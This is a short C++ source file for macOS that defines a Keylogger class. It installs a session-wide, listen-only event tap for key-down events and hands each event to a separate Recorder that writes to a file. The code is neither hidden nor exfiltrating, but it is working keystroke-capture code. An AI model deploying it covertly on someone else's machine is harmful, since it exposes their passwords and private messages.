#include "keylogger.hpp"

#include <ApplicationServices/ApplicationServices.h>

#include <cassert>

#include "recorder.hpp"

Keylogger::Keylogger(const std::string& out_path, bool record_virtual) : recorder_(out_path, record_virtual) {}

void Keylogger::Run() {
  CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);

  port_ = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly, mask, &Keylogger::tap_callback, &recorder_);
  assert(port_ != nullptr);

  source_ = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, port_, 0);

  CFRunLoopRef r = CFRunLoopGetCurrent();
  CFRunLoopAddSource(r, source_, kCFRunLoopCommonModes);

  CFRunLoopRun();
}

void Keylogger::Stop() {
  CFRunLoopStop(CFRunLoopGetCurrent());
  CFRelease(source_);
  CFRelease(port_);
}

CGEventRef Keylogger::tap_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* user_info) {
  Recorder* r = static_cast<Recorder*>(user_info);
  r->Handle(type, event);
  return NULL;
}
